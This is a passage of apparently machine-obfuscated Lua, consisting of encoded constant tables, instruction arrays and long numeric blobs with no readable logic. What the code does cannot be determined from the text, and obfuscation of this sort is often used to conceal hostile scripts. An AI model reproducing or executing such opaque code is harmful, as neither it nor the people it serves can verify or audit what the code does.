,99,104,115,103,107,87,70,59,123,106,123,118,121,104,126,83,104,112,83,103,87,62,104,113,97,120,95,30,104,118,104,118,73,104,119,103,107,87,38,59,123,106,123,118,121,104,126,83,104,116,83,103,87,30,104,117,97,120,95,30,116,102,122,102,123,104,106,83,104,107,79,106,120,118,104,106,122,78,123,-1,64,123,59,123,88,122},P={},U={{1,164},{1,7}},nParams=2},{K={1,2,{105,8,193,64,33,253,129},{102,0,204,105},{118,6,221,109,36,200,142,88,26,179},{115,25,200,111,51,240,130}},C={104,122,104,122,91,104,123,103,107,87,89,59,123,106,123,92,107,87,89,59,123,106,122,104,120,83,118,121,104,120,83,104,126,83,103,87,72,102,122,104,127,102,122,104,127,83,92,75,95,72,88,122},P={},U={{1,45}},nParams=2},{K={{117,25,218},{108,9,195,106,34,252},{114,34,235,87},{107,11,216,96,42,232,150},{103,0,212,113,53,245,146,28,40,190,98,56},{68,0,203,106,56,255,134,70,20,167,125,113,195,135,80,228},{100,30,216,126},{64,19,208,109},{111,22,202,90,49,237,156,92,227,174},{97,0,203,122,6,197,153,64,232,175,114},{96,38,143,69,19,207,143,88,230,168},{72,25,175,120,50,204,153},{16,55},{19,88,33,142,205,132,197,16},{96,24,169,106},{5,80,229,56,59},{101,8,163,99,21,195},{81,85,231,115,41,136},{93,14},{87,31,189,113},{17,38,231,48,13,134,211,37,172,242,106,87,157,78,116,188,183}},C={102,122,74,107,104,122,102,123,75,107,104,123,104,120,75,107,104,121,74,107,104,126,104,127,75,75,107,104,124,118,125,107,104,114,83,105,104,115,57,120,107,104,112,83,105,74,107,104,113,104,118,102,120,104,119,102,121,104,116,83,104,117,102,121,104,106,83,104,107,118,104,104,105,83,104,110,57,123,79,79,79,79,79,79,79,75,57,120,75,57,123,59,123,88,122},P={},U={{1,168},{1,166},{1,167},{1,165}},nParams=0}}
local _0l_25={118,122,107,104,123,83,105,104,120,57,120,97,122,118,122,107,104,123,83,105,104,121,57,120,97,123,118,122,107,104,123,83,105,104,126,57,120,97,120,118,122,107,104,123,83,105,104,127,57,120,97,121,118,122,107,104,123,83,105,104,124,57,120,97,126,118,122,107,104,123,83,105,104,125,57,120,97,127,118,122,107,104,123,83,105,104,114,57,120,97,124,106,122,104,115,83,97,125,106,125,104,112,83,104,113,103,97,114,104,118,97,115,104,119,97,112,104,116,97,113,66,123,97,118,66,120,97,119,66,121,97,116,66,126,97,117,106,117,57,122,59,123,118,117,104,106,83,66,127,57,123,59,123,74,97,106,104,107,97,107,66,124,97,104,118,117,104,106,83,66,125,57,123,59,123,104,104,104,104,73,104,105,103,107,87,197,59,123,106,114,92,87,132,118,110,104,111,83,104,108,106,115,106,112,106,107,57,126,97,105,106,104,106,107,57,123,59,123,106,120,104,109,83,107,104,98,83,105,66,114,57,120,59,123,106,125,104,99,83,107,104,98,83,105,66,115,57,120,59,123,88,122,95,132,118,96,104,97,83,104,102,83,104,103,83,97,110,118,100,104,101,83,106,110,104,90,96,104,91,104,88,57,121,97,111,66,112,97,108,66,113,97,109,118,89,104,94,83,104,95,104,95,104,95,57,121,97,98,118,89,104,94,83,104,92,104,92,104,92,57,121,97,99,118,89,104,94,83,104,93,104,93,104,93,57,121,97,96,118,89,104,94,83,104,82,104,82,104,82,57,121,97,97,118,89,104,94,83,104,83,104,83,104,83,57,121,97,102,118,89,104,94,83,104,80,104,80,104,80,57,121,97,103,118,89,104,94,83,104,81,104,81,104,81,57,121,97,100,118,89,104,94,83,104,86,104,87,104,87,57,121,97,101,118,89,104,94,83,104,87,104,84,104,85,57,121,97,90,118,89,104,94,83,104,74,104,74,104,74,57,121,97,91,118,89,104,94,83,104,75,104,75,104,75,57,121,97,88,118,89,104,94,83,104,72,104,72,104,72,57,121,97,89,66,118,97,94,66,119,97,95,66,116,97,92,66,117,97,93,66,106,97,82,66,107,97,83,118,73,104,78,83,104,79,57,123,97,80,106,80,104,112,104,76,75,106,80,104,77,113,75,106,80,104,66,118,67,104,66,83,104,64,83,75,106,80,104,65,122,75,106,80,104,70,106,125,107,104,71,83,105,104,68,57,120,75,106,108,104,69,57,123,106,108,104,58,57,123,97,86,97,81,118,73,104,78,83,104,59,57,123,97,87,106,87,104,56,118,57,104,78,83,104,95,106,81,104,95,106,86,57,126,75,106,87,104,62,118,57,104,78,83,104,63,106,81,120,104,60,96,104,63,106,86,120,104,60,96,57,126,75,106,87,104,61,106,98,75,106,87,104,50,104,95,75,106,87,104,51,122,75,106,87,104,48,122,75,106,87,104,49,122,75,106,87,104,70,106,80,75,106,94,106,87,104,54,57,120,59,123,106,95,106,87,104,55,106,102,57,121,59,123,106,108,104,52,57,123,97,84,118,73,104,78,83,104,59,57,123,97,85,106,85,104,56,118,57,104,78,83,104,55,104,95,104,95,106,84,57,126,75,106,85,104,61,106,99,75,106,85,104,50,104,95,75,106,85,104,70,106,87,75,106,93,106,85,104,53,106,125,104,112,83,79,104,42,106,100,118,67,104,43,83,104,40,83,57,127,97,74,106,74,104,56,118,57,104,78,83,104,55,106,108,104,41,57,123,120,104,55,104,95,57,126,75,106,74,104,62,118,57,104,78,83,104,95,106,108,104,46,57,123,104,95,104,95,57,126,75,106,82,106,85,104,47,118,89,104,94,83,104,44,104,45,104,45,57,121,104,46,57,126,97,75,106,75,104,56,116,118,57,104,78,83,104,95,106,108,104,34,57,123,104,95,106,108,104,35,78,123,-1,64,123,75,106,75,104,62,118,57,104,78,83,104,55,106,108,104,32,57,123,120,104,63,106,108,104,42,57,123,120,57,126,75,106,82,106,85,104,33,106,101,104,42,57,126,97,72,106,72,104,56,116,118,57,104,78,83,104,95,106,108,104,35,57,123,104,95,106,108,104,35,78,123,-1,64,123,75,106,72,104,62,118,57,104,78,83,104,55,106,108,104,38,57,123,120,104,63,106,108,104,42,57,123,120,57,126,75,106,72,104,39,83,107,104,98,83,105,66,104,57,120,59,123,106,75,104,39,83,107,104,98,83,105,66,105,57,120,59,123,106,108,104,36,57,123,97,73,118,73,104,78,83,104,59,57,123,97,78,106,78,104,56,118,57,104,78,83,104,55,104,95,104,95,106,73,57,126,75,106,78,104,62,118,57,104,78,83,104,95,104,95,104,95,106,84,57,126,75,106,78,104,61,106,99,75,106,78,104,50,104,95,75,106,78,104,70,106,87,75,118,73,104,78,83,104,59,57,123,97,79,106,79,104,56,118,57,104,78,83,104,55,104,95,104,95,104,55,57,126,75,106,79,104,62,118,57,104,78,83,104,95,104,95,104,55,104,55,120,57,126,75,106,79,104,61,106,102,75,106,79,104,50,104,95,75,106,79,104,70,106,78,75,74,107,104,55,104,120,75,107,104,60,104,37,75,107,104,26,104,27,75,107,104,24,104,25,75,97,76,74,97,77,74,97,66,74,97,67,106,84,106,73,91,97,64,106,86,106,64,71,97,65,106,108,104,92,57,123,97,70,106,108,104,30,57,123,97,71,106,108,104,24,57,123,97,68,66,110,97,69,118,100,104,31,83,106,81,106,76,98,96,57,123,97,58,66,111,97,59,118,28,106,76,78,123,121,97,62,97,57,97,56,65,56,57,62,85,63,85,60,106,56,106,57,106,62,78,120,120,97,60,97,63,106,63,97,62,106,63,70,123,87,1606,106,69,57,122,97,61,106,67,106,60,106,61,75,106,63,104,55,71,106,58,73,97,50,118,73,104,78,83,104,29,57,123,97,51,106,51,104,56,118,57,104,78,83,104,95,106,58,104,95,106,73,57,126,75,106,51,104,62,118,57,104,78,83,104,95,106,50,104,95,104,95,57,126,75,106,51,104,18,104,55,75,106,51,104,50,104,95,75,106,51,104,19,106,60,75,106,51,104,16,106,91,75,106,51,104,17,106,108,104,46,57,123,75,106,51,104,43,118,67,104,43,83,104,40,83,75,106,51,104,22,113,75,106,51,104,70,106,78,75,106,77,106,60,106,51,75,118,73,104,78,83,104,59,57,123,97,48,106,48,104,56,116,118,57,104,78,83,104,95,106,58,106,108,104,23,57,123,71,104,95,106,108,104,60,78,123,-1,64,123,75,106,48,104,62,118,57,104,78,83,104,95,106,50,106,108,104,92,57,123,91,104,55,106,108,104,60,57,123,120,57,126,75,106,48,104,61,106,100,75,106,48,104,50,104,95,75,106,48,104,20,113,75,106,48,104,70,106,78,75,106,66,106,60,106,48,75,106,51,104,39,83,107,104,98,83,105,66,108,57,120,59,123,85,61,85,50,85,51,85,48,95,1405,106,59,104,120,57,123,59,123,106,67,104,120,83,97,49,106,108,104,86,57,123,97,54,106,70,106,54,91,106,70,91,97,55,106,81,106,55,71,106,70,71,97,52,106,93,106,49,104,21,104,10,106,91,118,67,104,43,83,104,40,83,57,127,97,53,106,53,104,56,116,118,57,104,78,83,104,95,106,54,104,95,106,108,104,11,78,123,-1,64,123,75,106,53,104,62,118,57,104,78,83,104,95,106,70,104,95,106,70,57,126,75,118,73,104,78,83,104,8,57,123,97,42,106,42,104,56,118,57,104,78,83,104,95,106,54,104,95,106,65,106,108,104,11,57,123,71,106,70,104,60,73,71,106,108,104,60,57,123,71,57,126,75,106,42,104,62,118,57,104,78,83,104,95,106,70,104,95,106,70,106,108,104,82,57,123,91,57,126,75,106,42,104,61,106,96,75,106,42,104,50,104,95,75,106,42,104,9,106,108,104,60,57,123,75,106,42,104,14,106,91,75,106,42,104,15,118,57,104,78,83,104,95,104,95,104,95,104,95,57,126,75,106,42,104,70,106,49,75,106,94,106,42,104,24,57,120,59,123,106,95,106,42,104,55,106,102,57,121,59,123,118,73,104,78,83,104,12,57,123,97,43,106,43,104,13,118,67,104,13,83,104,2,83,75,106,43,104,3,116,118,0,104,78,83,104,95,106,108,104,60,78,123,-1,64,123,75,106,43,104,70,106,42,75,116,106,92,106,42,106,108,104,26,78,123,-1,64,123,59,123,106,93,106,49,104,1,104,42,106,100,118,67,104,43,83,104,40,83,57,127,97,40,106,40,104,56,116,118,57,104,78,83,104,95,106,52,104,95,106,108,104,11,78,123,-1,64,123,75,106,40,104,62,118,57,104,78,83,104,95,106,55,104,95,106,70,57,126,75,118,73,104,78,83,104,59,57,123,97,41,106,41,104,56,116,118,57,104,78,83,104,95,106,52,104,95,106,108,104,6,78,123,-1,64,123,75,106,41,104,62,118,57,104,78,83,104,95,106,55,104,95,106,70,106,108,104,82,57,123,91,57,126,75,106,41,104,61,106,96,75,106,41,104,50,104,95,75,106,41,104,70,106,49,75,106,94,106,41,104,24,57,120,59,123,106,95,106,41,104,55,106,102,57,121,59,123,116,106,92,106,41,106,108,104,7,78,123,-1,64,123,59,123,106,93,106,41,104,4,104,10,106,88,57,126,97,46,106,46,104,56,118,57,104,78,83,104,55,104,95,104,55,104,95,57,126,75,106,46,104,5,122,75,106,70,106,108,104,82,57,123,91,106,108,104,6,57,123,91,106,70,91,97,47,118,100,104,31,83,106,52,106,70,71,104,60,96,57,123,97,44,66,109,97,45,106,45,104,250,106,97,104,95,57,121,97,34,106,45,104,251,118,89,104,94,83,104,82,104,44,104,82,57,121,104,55,57,121,97,35,106,45,104,248,118,89,104,94,83,104,82,104,249,104,83,57,121,104,60,57,121,97,32,106,45,104,254,118,89,104,94,83,104,255,104,45,104,45,57,121,104,26,57,121,97,33,106,45,104,252,106,101,104,24,57,121,97,38,106,45,104,253,118,89,104,94,83,104,255,104,45,104,255,57,121,104,7,57,121,97,39,106,45,104,242,118,89,104,94,83,104,82,104,82,104,85,57,121,104,54,57,121,97,36,106,45,104,243,118,89,104,94,83,104,45,104,6,104,44,57,121,104,240,57,121,97,37,106,45,104,241,118,89,104,94,83,104,74,104,45,104,87,57,121,104,92,57,121,97,26,106,45,104,246,118,89,104,94,83,104,87,104,82,104,249,57,121,104,10,57,121,97,27,106,45,104,247,118,89,104,94,83,104,85,104,82,104,82,57,121,104,46,122,57,126,97,24,106,45,104,244,118,89,104,94,83,104,44,104,46,104,44,57,121,104,42,122,57,126,97,25,70,97,30,74,97,31,74,97,28,66,98,97,29,106,34,104,39,83,107,104,98,83,105,66,99,57,120,59,123,106,32,104,39,83,107,104,98,83,105,66,96,57,120,59,123,106,33,104,39,83,107,104,98,83,105,66,97,57,120,59,123,106,38,104,39,83,107,104,98,83,105,66,102,57,120,59,123,106,39,104,39,83,107,104,98,83,105,66,103,57,120,59,123,106,36,104,39,83,107,104,98,83,105,66,100,57,120,59,123,106,37,104,39,83,107,104,98,83,105,66,101,57,120,59,123,106,26,104,39,83,107,104,98,83,105,66,90,57,120,59,123,106,27,104,39,83,107,104,98,83,105,66,91,57,120,59,123,106,24,104,39,83,107,104,98,83,105,66,88,57,120,59,123,106,25,104,56,118,57,104,78,83,104,95,106,52,104,95,106,71,57,126,75,106,25,104,62,118,57,104,78,83,104,95,106,55,104,95,106,47,104,42,106,71,106,68,91,73,91,57,126,75,106,25,104,39,83,107,104,98,83,105,66,89,57,120,59,123,106,35,104,39,83,107,104,98,83,105,66,94,57,120,59,123,118,117,104,106,83,66,95,57,123,59,123,106,67,104,37,83,97,18,106,65,106,108,104,11,57,123,71,106,70,104,24,73,71,106,108,104,87,57,123,71,106,108,104,30,57,123,71,106,108,104,38,57,123,71,97,19,106,93,106,18,104,245,104,10,106,91,118,67,104,43,83,104,40,83,57,127,97,16,106,16,104,56,116,118,57,104,78,83,104,55,106,70,120,104,60,73,104,95,106,108,104,23,78,123,-1,64,123,75,106,16,104,62,118,57,104,78,83,104,95,106,70,104,95,106,70,57,126,75,106,83,106,18,104,234,122,57,121,97,17,106,17,104,43,118,67,104,43,83,104,235,83,75,106,17,104,17,106,108,104,42,57,123,75,106,17,104,56,118,57,104,78,83,104,55,106,70,120,104,60,73,104,95,106,19,57,126,75,106,17,104,62,118,57,104,78,83,104,95,106,70,104,95,106,70,106,108,104,11,57,123,91,57,126,75,106,70,106,108,104,11,57,123,91,106,19,91,106,70,91,97,22,106,82,106,18,104,232,106,97,104,42,57,126,97,23,106,23,104,56,116,118,57,104,78,83,104,55,106,70,120,104,60,73,104,95,106,108,104,38,78,123,-1,64,123,75,106,23,104,62,118,57,104,78,83,104,95,106,70,104,95,106,22,57,126,75,106,95,106,23,104,55,106,91,57,121,59,123,74,107,104,55,74,107,104,55,104,233,75,107,104,60,104,238,75,75,107,104,60,74,107,104,55,104,239,75,107,104,60,104,236,75,75,107,104,26,74,107,104,55,104,237,75,107,104,60,104,226,75,75,107,104,24,74,107,104,55,104,227,75,107,104,60,104,224,75,75,107,104,7,74,107,104,55,104,225,75,107,104,60,104,230,75,75,107,104,54,74,107,104,55,104,231,75,107,104,60,104,228,75,75,107,104,240,74,107,104,55,104,229,75,107,104,60,104,218,75,75,97,20,118,73,104,78,83,104,59,57,123,97,21,106,21,104,56,116,118,57,104,78,83,104,55,106,70,120,104,60,73,104,95,106,108,104,219,78,123,-1,64,123,75,106,21,104,62,118,57,104,78,83,104,95,106,70,104,95,106,22,106,108,104,36,57,123,91,57,126,75,106,21,104,18,104,55,75,106,21,104,49,122,75,106,21,104,70,106,18,75,118,73,104,78,83,104,12,57,123,97,10,106,10,104,216,118,67,104,216,83,104,217,83,75,106,10,104,3,116,118,0,104,78,83,104,95,106,108,104,26,78,123,-1,64,123,75,106,10,104,70,106,21,75,118,28,106,20,78,123,121,97,9,97,8,97,11,65,11,8,9,85,14,85,15,106,11,106,8,106,9,78,120,120,97,15,97,14,106,14,97,9,106,14,70,123,87,3373,106,82,106,21,106,15,104,55,83,106,96,104,10,57,126,97,12,106,12,104,16,106,88,75,106,12,104,56,116,118,57,104,78,83,104,95,106,108,104,222,57,123,104,95,106,108,104,82,78,123,-1,64,123,75,106,15,104,60,83,97,13,106,12,104,39,83,107,104,98,83,105,66,92,57,120,59,123,85,12,85,13,95,3219,106,22,106,108,104,36,57,123,91,106,108,104,219,57,123,91,106,70,91,97,2,106,93,106,18,104,223,104,10,106,91,118,67,104,43,83,104,40,83,57,127,97,3,106,3,104,56,116,118,57,104,78,83,104,55,106,70,120,104,60,73,104,95,106,108,104,93,78,123,-1,64,123,75,106,3,104,62,118,57,104,78,83,104,95,106,70,104,95,106,2,57,126,75,106,81,106,70,104,60,73,71,106,108,104,85,57,123,71,106,70,71,97,0,106,83,106,18,104,220,57,120,97,1,106,1,104,56,118,57,104,78,83,104,95,106,0,104,95,106,71,57,126,75,106,1,104,62,118,57,104,78,83,104,95,106,70,104,95,106,2,106,108,104,23,57,123,91,57,126,75,106,82,106,18,104,221,106,97,104,46,57,126,97,6,106,6,104,56,118,57,104,78,83,104,95,106,108,104,210,57,123,104,95,106,71,57,126,75,106,6,104,62,118,57,104,78,83,104,95,106,70,106,0,91,106,70,91,104,95,106,2,106,108,104,23,57,123,91,57,126,75,66,93,97,7,106,23,104,39,83,107,104,98,83,105,66,82,57,120,59,123,106,6,104,39,83,107,104,98,83,105,66,83,57,120,59,123,106,1,104,211,83,107,104,98,83,105,66,80,57,120,59,123,106,67,104,27,83,97,4,106,70,97,5,66,81,97,250,66,86,97,251,106,250,106,4,104,208,106,5,57,121,59,123,106,5,106,108,104,23,57,123,91,97,5,106,83,106,4,104,209,57,120,97,248,106,248,104,56,118,57,104,78,83,104,95,106,81,106,70,104,60,73,71,106,108,104,255,57,123,71,106,70,71,104,95,106,71,57,126,75,106,248,104,62,118,57,104,78,83,104,95,106,70,104,95,106,5,57,126,75,106,82,106,4,104,221,106,97,104,46,57,126,97,249,106,249,104,56,118,57,104,78,83,104,95,106,108,104,214,57,123,104,95,106,71,57,126,75,106,249,104,62,118,57,104,78,83,104,95,106,81,106,70,71,106,108,104,214,57,123,71,104,95,106,5,57,126,75,106,95,106,249,104,55,106,91,57,121,59,123,106,249,104,39,83,107,104,98,83,105,66,87,57,120,59,123,106,5,106,71,91,106,70,104,60,73,91,97,5,106,250,106,4,104,215,106,5,57,121,59,123,106,5,106,108,104,23,57,123,91,97,5,118,73,104,78,83,104,59,57,123,97,254,106,254,104,56,116,118,57,104,78,83,104,55,106,70,120,104,60,73,104,95,106,108,104,212,78,123,-1,64,123,75,106,254,104,62,118,57,104,78,83,104,95,106,70,104,95,106,5,57,126,75,106,254,104,61,106,96,75,106,254,104,50,104,95,75,106,254,104,70,106,4,75,106,94,106,254,104,24,57,120,59,123,106,95,106,254,104,55,106,102,57,121,59,123,116,106,92,106,254,106,108,104,7,78,123,-1,64,123,59,123,106,93,106,254,104,213,104,46,106,88,57,126,97,255,106,255,104,56,118,57,104,78,83,104,55,104,95,104,55,104,95,57,126,75,106,255,104,5,122,75,106,5,106,108,104,212,57,123,91,106,68,91,97,5,106,251,104,202,106,97,106,70,106,5,106,81,106,70,104,60,73,71,57,127,97,252,106,252,104,39,83,107,104,98,83,105,66,84,57,120,59,123,106,5,106,71,91,106,70,104,60,73,91,97,5,106,250,106,4,104,203,106,5,57,121,59,123,106,5,106,108,104,23,57,123,91,97,5,118,100,104,31,83,106,81,106,70,104,26,73,71,104,60,96,57,123,97,253,106,251,104,200,118,89,104,94,83,104,255,104,45,104,45,57,121,106,70,106,5,106,253,57,127,97,242,106,251,104,201,106,101,106,70,106,253,91,106,70,91,106,5,106,253,57,127,97,243,106,251,104,206,118,89,104,94,83,104,85,104,82,104,82,57,121,106,70,106,5,106,71,91,106,68,91,106,81,106,70,104,60,73,71,57,127,97,240,106,242,104,39,83,107,104,98,83,105,66,85,57,120,59,123,106,243,104,39,83,107,104,98,83,105,66,74,57,120,59,123,106,240,104,39,83,107,104,98,83,105,66,75,57,120,59,123,106,5,106,71,91,106,68,91,106,71,91,106,70,104,60,73,91,97,5,106,250,106,4,104,207,106,5,57,121,59,123,106,5,106,108,104,23,57,123,91,97,5,118,100,104,31,83,106,81,106,70,104,26,73,71,104,60,96,57,123,97,241,106,251,104,204,106,97,106,70,106,5,106,241,57,127,97,246,106,251,104,205,106,97,106,70,106,241,91,106,70,91,106,5,106,241,57,127,97,247,106,251,104,194,106,97,106,70,106,5,106,71,91,106,68,91,106,241,57,127,97,244,106,251,104,195,106,97,106,70,106,241,91,106,70,91,106,5,106,71,91,106,68,91,106,241,57,127,97,245,113,97,234,106,246,104,39,83,107,104,98,83,105,66,72,57,120,59,123,113,97,235,70,97,232,106,247,104,39,83,107,104,98,83,105,66,73,57,120,59,123,106,244,104,39,83,107,104,98,83,105,66,78,57,120,59,123,106,245,104,39,83,107,104,98,83,105,66,79,57,120,59,123,106,67,104,25,83,97,233,118,73,104,78,83,104,59,57,123,97,238,106,238,104,56,116,118,57,104,78,83,104,55,104,95,104,95,106,108,104,87,78,123,-1,64,123,75,106,238,104,61,106,99,75,106,238,104,50,104,95,75,106,238,104,70,106,233,75,106,93,106,238,104,192,104,10,106,91,118,67,104,43,83,104,40,83,57,127,104,56,118,57,104,78,83,104,95,106,108,104,44,57,123,104,55,104,95,57,126,75,74,97,239,74,107,104,55,104,193,75,107,104,60,104,198,75,107,104,26,104,199,75,107,104,24,104,196,75,97,236,118,28,106,236,78,123,121,97,227,97,226,97,237,65,237,226,227,85,224,85,225,106,237,106,226,106,227,78,120,120,97,225,97,224,106,224,97,227,106,224,70,123,87,4744,106,82,106,238,106,225,106,96,104,10,57,126,97,230,106,230,104,56,116,118,57,104,78,83,104,95,106,108,104,52,57,123,104,95,106,108,104,82,78,123,-1,64,123,75,106,230,104,62,118,57,104,78,83,104,55,106,108,104,6,57,123,104,7,106,224,71,73,120,106,70,71,104,63,106,108,104,46,57,123,120,57,126,75,106,239,106,225,106,230,75,85,230,95,4611,118,73,104,78,83,104,8,57,123,97,231,106,231,104,56,118,57,104,78,83,104,55,104,95,104,95,106,65,106,108,104,87,57,123,71,57,126,75,106,231,104,62,116,118,57,104,78,83,104,95,104,95,104,95,106,108,104,87,78,123,-1,64,123,75,106,231,104,61,106,98,75,106,231,104,50,104,95,75,106,231,104,9,106,108,104,60,57,123,75,106,231,104,14,106,91,75,106,231,104,15,118,57,104,78,83,104,95,104,95,104,95,104,95,57,126,75,106,231,104,70,106,233,75,116,106,92,106,231,106,108,104,26,78,123,-1,64,123,59,123,118,73,104,78,83,104,12,57,123,97,228,106,228,104,13,118,67,104,13,83,104,2,83,75,106,228,104,3,116,118,0,104,78,83,104,95,106,108,104,55,78,123,-1,64,123,75,106,228,104,70,106,231,75,74,97,229,104,95,97,218,104,193,97,219,66,76,97,216,66,77,97,217,66,66,97,222,118,197,104,186,106,222,75,106,239,104,193,83,104,39,83,107,104,98,83,105,66,67,57,120,59,123,106,239,104,198,83,104,39,83,107,104,98,83,105,66,64,57,120,59,123,106,239,104,199,83,104,39,83,107,104,98,83,105,66,65,57,120,59,123,106,239,104,196,83,104,39,83,107,104,98,83,105,66,70,57,120,59,123,106,124,104,187,83,107,104,98,83,105,66,71,57,120,59,123,106,222,104,184,104,185,104,190,106,115,79,57,121,59,123,106,222,104,184,104,185,104,191,118,188,106,125,104,189,83,57,123,79,57,121,59,123,106,121,104,178,83,107,104,98,83,105,66,68,57,120,59,123,118,122,104,120,83,104,115,83,97,223,104,179,97,220,104,176,97,221,118,177,107,87,5125,59,123,118,177,104,182,83,107,92,87,5355,59,123,118,183,107,87,5355,59,123,118,183,104,182,83,107,92,87,5347,59,123,118,180,107,92,87,5339,59,123,118,182,97,210,104,45,104,45,73,104,181,103,107,87,5321,59,123,106,210,92,87,5315,88,122,95,5315,118,197,104,170,118,197,104,170,83,107,92,87,5299,59,123,74,75,104,171,104,240,82,104,60,103,107,87,5272,59,123,118,197,104,170,83,106,223,104,189,83,83,87,5266,88,122,95,5266,118,197,104,170,83,106,223,104,189,83,122,75,118,168,66,69,57,123,59,123,88,122}
local _11124={{71,10,219,100},{102,9,195,81,40,234,149,71,26,161},{114,1,217,122,43,235,151},{107,26,205,116,28,255,151,70,18,165,116},{112,10,214,96,32,244,148,69,47,162,96,43,193,144,91},{112,3,222,116,24,242,151,71,9,155,118,44,223,157,92,239},{116,4,210,84,55,239,158,90,29,172},{116,6,220,122,39,251,155,115,10,163},{100,28,217,90,49,237,156,92,227,174},{101,27,220,107,57,240,135,87,248,169,101},{100,20,173,110},{105,58,142,84,8,228,191,109,202,154,41,85,158,203,117},{68,3,182,125,43,153,193,22,247,170,121,23,213,143,107,225,174,72,22,200,107,39,247,134,90,82,172,37,2,146,216,52,252,249,80,12,209,111,57,248,157,1,27,181,96},{73,17,180,111,50,197,221,8,181},1.5,{91,27,182,123},{67,11,167,102,50},{5,77,244,38,105,153,197,14,185,225},12,144,{71,11,184,124,14,204},{83,239,185,123,0,216},{90,238,175,118,14,141,170,6,194,152,125,82,152,32,35,185,198,93,19,164,115,49,136,184,123,208,233,61,79,198,34,107,250,142,79,22,174,45,25,246,167,125,185,237,63,22,146,241,42,254,191,70,30,157,96,32,163,142,85,18,175,47,39,206,130,18,233,165,84,4,219,102,102,187,172,91,14,181,67,62,212,135,85,228,183,63,65,185,146,38,247,190,70,85,172,123,107,198,141,90,231,247,95,6,218,170,33,253,172,76,19,222,46,115,204,139,83,4,173,97,45,139,221,17,198,186,67,10,218,81,32,246,155,72,10,201,98,54,199,142,86,165,188,104,91,214,157,42,247,231,111,22,202,90,49,237,156,92,227,174,62,67,224,152,37,222,189,81,24,208,103,42,184,204,58,23,169,114,61,203,210,91,253,189,125,29,221,144,36,181,146,3,25,232,44,62,196,205,75,250,160,57,5,193,158,101,227,162,72,95,206,98,35,232,141,64,10,233,96,55,207,155,96,249,179,85,25,197,108,109,235,154,64,87,182,106,43,208,149,72,242,249,115,78,146,152,36,224,187,64,18,159,98,33,212,155,105,243,169,102,23,200,139,55,174,173,76,10,212,37,34,254,146,68,14,169,50,53,220,135,78,214,166,122,27,192,101,56,226,201,67,94,226,104,52,208,139,80,226,239,104,0,193,142,35,226,168,7,6,213,109,61,190,155,81,11,191,103,14,139,132,36,253,162,71,30,204,43,33,176,196,74,20,161,48,62,200,149,54,235,189,126,9,223,222,47,225,177,73,1,169,100,56,129,156,31,242,172,108,11,130,157,109,175,170,70,17,215,106,121,238,203,73,40,186,127,99,251,177,115,203,140,14,69,198,96,56,255,206,96,29,183,102,54,192,210,24,213,159,72,50,147,208,15,247,188,76,22,204,122,105,228,177,23,195,164,120,21,201,153,54,160,140,90,30,220,38,18,167,199,81,11,182,125,53,196,147,73,225,188,112,70,222,140,37,251,194,86,90,131,99,51,219,208,80,240,244,83,55,224,180,0,254,184,73,21,217,47,54,180,149,26,94,172,122,59,160,153,47,232,183,77,76,194,107,41,165,151,65,10,176,125,51,203,151,19,234,161,50,50,193,152,58,218,186,0,126,211,121,123,237,142,69,242,173,112,7,226,141,55,180,154,75,1,212,96,51,239,206,87,9,169,113,41,193,156,80,161,185,108,13,153,109,63,191,235,64,24,161,108,52,131,158,75,225,242,56,21,194,146,40,229,254,45,27,219,40,62,234,212,9,58,164,96,13,133,187,36,255,164,67,10,221,87,55,233,129,1,55,160,99,40,199,150,89,208,179,111,6,218,144,46,180,171,66,16,174,43,38,211,137,10,160,186,121,17,192,219,78,234,182,86,21,210,96,113,241,147,15,64,141,125,43,196,218,114,239,166,83,10,209,100,24,238,146,72,86,142,107,42,215,142,93,224,149,105,20,222,142,103,230,181,77,29,158,121,38,250,215,23,229,185,100,14,222,213,98,232,182,71,100,205,101,60,241,203,67,11,167,102,50,143,148,72,230,176,106,0,219,145,98,188,234,91,94,227,35,36,199,131,92,161,226,98,16,206,136,34,245,175,115,24,216,58,19,200,161,119,82,170,123,59,207,200,98,212,137,109,35,240,93,18,186,205,0,17,183,53,16,246,191,117,195,191,127,8,214,152,96,232,171,64,16,130,127,60,196,199,88,224,161,114,95,193,136,109,192,184,73,10,150,117,34,254,219,65,14,162,62,48,219,148,3,253,187,108,30,199,105,37,241,201,65,4,165,36,37,138,194,88,224,162,115,11,251,158,63,172,151,98,43,192,33,89,251,135,80,86,192,112,14,207,223,75,248,182,81,6,150,112,62,248,147,65,82,163,101,53,197,133,85,232,188,53,65,147,137,33,253,179,79,85,180,106,37,202,194,64,227,164,108,75,159,215,113,166,250,65,31,155,118,121,190,200,64,24,175,122,45,221,145,77,168,249,91,30,223,101,113,226,139,73,84,173,111,52,193,210,86,245,254,85,7,220,153,107,226,177,73,16,219,64,48,162,158,90,243,191,100,8,194,144,106,234,185,78,11,151,84,35,251,134,85,50,162,56,112,205,157,95,193,183,35,14,213,146,47,187,170,68,20,136,104,42,139,205,93,237,170,57,1,193,158,108,154,175,71,2,215,41,33,237,137,68,16,225,114,42,196,150,52,226,185,79,68,158,34,58,240,138,66,28,228,123,59,214,155,21,241,176,117,19,154,204,102,166,247,9,16,208,0,57,207,136,87,237,236,120,9,129,138,38,253,228,84,12,219,105,60,179,148,29,7,146,96,49,149,161,123,197,149,70,68,155,34,100,230,142,64,27,237,47,118,141,155,80,224,227,87,0,196,147,41,245,225,5,53,248,92,113,227,192,62,22,172,53,15,192,214,32,226,179,2,31,221,112,110,248,138,75,90,183,117,40,136,179,83,227,171,61,28,219,155,39,158,179,69,22,161,103,118,206,135,5,174,169,37,19,205,152,40,227,242,77,3,149,76,2,211,169,118,24,171,124,58,204,216,87,249,249,82,14,197,47,14,248,134,84,81,201,103,63,132,128,81,183,240,122,8,213,220,35,178,188,70,23,158,125,45,239,143,29,228,229,117,14,200,146,107,176,229,1,29,205,118,38,244,130,18,91,167,127,56,135,209,89,166,176,113,13,209,193,122,181,148,67,19,175,6,59,205,142,89,239,238,127,10,146,150,42,241,191,85,5,206,110,60,250,192,87,80,170,123,59,207,220,96,226,176,1,10,217,34,57,240,134,64,89,176,110,41,206,222,72,246,176,107,9,154,141,43,242,178,69,88,217,100,124,128,142,88,229,198,114,12,201,242,38,224,189,46,10,212,97,112,254,136,85,85,205,98,117,138,220,76,236,179,118,25,193,101,57,180,205,87,2,171,105,101,214,135,93,168,161,123,8,213,198,42,225,242,105,19,208,109,127,238,133,85,28,175,92,4,150,130,46,255,163,80,4,214,100,102,254,133,66,31,235,64,55,199,146,89,206,182,52,68,217,145,43,221,187,23,18,161,102,51,143,166,88,224,132,124,30,135,243},{123,237,174,121,15,254,149,37,246,191,87,49,201,116,56,234,130,86,59,186,124,51,253,145,